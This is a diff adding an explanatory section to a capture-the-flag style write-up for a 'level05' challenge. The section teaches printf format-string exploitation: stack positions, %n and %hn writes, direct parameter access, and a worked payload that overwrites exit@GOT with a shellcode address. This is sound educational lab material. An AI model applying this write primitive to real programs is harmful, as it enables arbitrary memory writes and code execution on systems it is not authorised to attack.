@@ -382,6 +382,215 @@ Short write (%hn): Write 2 bytes at a time
 
 By splitting the write into two 2-byte operations, we keep the exploit practical and fast.
 
+### How Printf Format String Exploitation Works
+
+Understanding the mechanics behind format string exploits.
+
+#### The printf Stack Model
+
+When you call `printf` normally:
+
+```c
+printf("Hello %s, you have %d messages", username, count);
+```
+
+**Stack layout:**
+```
+┌─────────────────────────────┐ ← Lower addresses
+│ count (int)                 │ ← Argument 2
+├─────────────────────────────┤
+│ username (char *)           │ ← Argument 1
+├─────────────────────────────┤
+│ format string pointer       │ ← Argument 0
+├─────────────────────────────┤
+│ Return address              │
+└─────────────────────────────┘ ← Higher addresses
+```
+
+Printf walks the stack reading arguments: arg0 (format), arg1 (username), arg2 (count).
+
+**With format string vulnerability:**
+
+```c
+printf(buffer);  // User controls the format string!
+```
+
+**Stack layout:**
+```
+┌─────────────────────────────┐
+│ [random stack data]         │ ← Position 3, 4, 5...
+├─────────────────────────────┤
+│ [random stack data]         │ ← Position 2
+├─────────────────────────────┤
+│ [random stack data]         │ ← Position 1
+├─────────────────────────────┤
+│ buffer pointer              │ ← Position 0 (format string)
+├─────────────────────────────┤
+│ ...                         │
+├─────────────────────────────┤
+│ OUR INPUT BUFFER            │ ← Position 10 (in level05)
+│ "AAAA%x%x%x..."             │
+└─────────────────────────────┘
+```
+
+Printf still walks the stack, but now reads whatever is there - including our controlled buffer!
+
+#### Format Specifier Mechanics
+
+| Specifier | Reads From Stack | Writes To Memory | Output | Purpose in Exploit |
+|-----------|-----------------|------------------|--------|-------------------|
+| `%x` | ✅ Next stack position | ❌ No | Hex value | **Padding** - increment byte counter |
+| `%s` | ✅ Address at position | ❌ No | String at address | Leak memory contents |
+| `%n` | ✅ Address at position | ✅ 4 bytes | Nothing | **Write byte count** to address |
+| `%hn` | ✅ Address at position | ✅ 2 bytes | Nothing | **Write byte count** (short) |
+
+**How they work:**
+
+```c
+// %x - Reads value and prints it
+printf("%x", value);
+// Reads 'value' from stack → prints as hex → increments byte counter
+
+// %n - Reads address and writes to it
+printf("%n", &variable);
+// Reads '&variable' from stack → writes byte count to that address
+```
+
+#### Direct Parameter Access
+
+Instead of sequential access (`%x %x %x`), we can jump directly to a position:
+
+```
+%10$hn  means "access argument at position 10"
+ ^^  ^^
+ ||  ||
+ ||  |+-- Format: short write (%hn)
+ ||  +--- Dollar sign: direct access
+ |+------ Position number
+ +------- Percent sign: format specifier
+```
+
+**Example:**
+```c
+// Sequential access (slow):
+"%x%x%x%x%x%x%x%x%x%hn"  // Reads positions 1-9, writes at 10
+
+// Direct access (fast):
+"%10$hn"  // Jump directly to position 10 and write
+```
+
+#### Buffer Position in Stack
+
+In level05, our input buffer is at **stack position 10**:
+
+```
+Stack positions during printf execution:
+┌──────────────────────────────────────┐
+│ Position 1:  0x64          (junk)   │ ← %x reads this
+│ Position 2:  0xf7fcfac0    (junk)   │ ← %x would read this
+│ Position 3:  0x00000000    (junk)   │
+│ ...                                  │
+│ Position 9:  0x25207025    (junk)   │
+├──────────────────────────────────────┤
+│ Position 10: [0xe0 0x97 0x04 0x08]  │ ← Our first address!
+│              [0xe2 0x97 0x04 0x08]  │
+│ Position 11: [%56718x%10$hn...]     │ ← Our format string
+│              [...%8809x%11$hn]      │
+└──────────────────────────────────────┘
+```
+
+We placed addresses **at positions 10 and 11** by putting them at the start of our buffer.
+
+#### The %n Write Primitive
+
+`%n` writes **the number of bytes printed so far** to the address it reads from the stack.
+
+**Byte counting example:**
+
+```c
+int count;
+printf("Hello%n", &count);
+//      ^^^^^-- 5 bytes printed
+// Result: count = 5
+
+printf("ABCD%n", &count);
+//      ^^^^-- 4 bytes printed
+// Result: count = 4
+
+printf("%100x%n", value, &count);
+//      ^^^^^^-- prints 100 characters (padded hex)
+// Result: count = 100
+```
+
+**In our exploit:**
+
+```python
+struct.pack("<I", 0x080497e0) +  # 4 bytes printed (count = 4)
+struct.pack("<I", 0x080497e2) +  # 4 bytes printed (count = 8)
+"%56718x" +                       # 56718 bytes printed (count = 56726)
+"%10$hn"                          # Writes 56726 to address at position 10
+```
+
+#### Our Exploit Flow
+
+**Complete visualization:**
+
+```
+Step 1: Buffer contents in memory
+┌───────────────────────────────────────────────────────────┐
+│ [0xe0 0x97 0x04 0x08][0xe2 0x97 0x04 0x08]%56718x%10$hn%8809x%11$hn │
+│  ^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^                │
+│  Position 10 (exit@GOT) Position 11 (exit@GOT+2)          │
+└───────────────────────────────────────────────────────────┘
+
+Step 2: Printf processes the format string
+┌───────────────────────────────────────────────────────────┐
+│ Action: Print addresses as literal characters             │
+│ Output: à◗â◗                                              │
+│ Bytes printed: 8                                           │
+└───────────────────────────────────────────────────────────┘
+
+Step 3: Process %56718x
+┌───────────────────────────────────────────────────────────┐
+│ Action: Read value at position 1 (e.g., 0x64)             │
+│ Output: [56716 spaces]64                                   │
+│ Bytes printed: 8 + 56718 = 56726                           │
+└───────────────────────────────────────────────────────────┘
+
+Step 4: Process %10$hn
+┌───────────────────────────────────────────────────────────┐
+│ Action: Read address at position 10 (0x080497e0)          │
+│         Write 56726 (0xdd96) to that address               │
+│ Memory write: [0x080497e0] = 0xdd96                        │
+│ Result: exit@GOT lower 2 bytes = 0xdd96 ✅                │
+└───────────────────────────────────────────────────────────┘
+
+Step 5: Process %8809x
+┌───────────────────────────────────────────────────────────┐
+│ Action: Read next value and print with padding            │
+│ Output: [8807 spaces]XX                                    │
+│ Bytes printed: 56726 + 8809 = 65535                        │
+└───────────────────────────────────────────────────────────┘
+
+Step 6: Process %11$hn
+┌───────────────────────────────────────────────────────────┐
+│ Action: Read address at position 11 (0x080497e2)          │
+│         Write 65535 (0xffff) to that address               │
+│ Memory write: [0x080497e2] = 0xffff                        │
+│ Result: exit@GOT upper 2 bytes = 0xffff ✅                │
+└───────────────────────────────────────────────────────────┘
+
+Final Result:
+exit@GOT (0x080497e0) = 0xffffdd96 (shellcode address!)
+```
+
+**Key insights:**
+
+1. **Addresses in buffer** = We control what %n writes to
+2. **%x padding** = We control the value %n writes (by controlling byte count)
+3. **Direct access** = We can write to specific stack positions
+4. **Result** = Arbitrary write primitive: write any value to any address!
+
 ## 🔒 Security Notes
 
 ### Vulnerabilities Exploited
